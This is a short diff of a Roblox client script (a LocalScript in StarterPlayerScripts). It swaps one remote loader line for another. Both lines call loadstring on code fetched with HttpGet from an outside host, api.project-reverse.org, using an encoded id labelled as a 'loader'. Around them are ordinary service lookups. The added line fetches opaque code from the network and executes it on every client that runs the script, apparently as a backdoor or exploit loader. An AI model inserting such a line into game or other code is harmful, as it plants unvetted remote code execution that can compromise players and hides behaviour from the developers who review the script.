@@ -1,6 +1,4 @@
--- LocalScript (StarterPlayerScripts)
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjJkNTI5MmVlLWI4MzgtNDJhOS04YTdiLTMxNWI1YzRlMDcwNiIsImtpbmQiOiJsb2FkZXIifQ"))()
-wait(2)
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
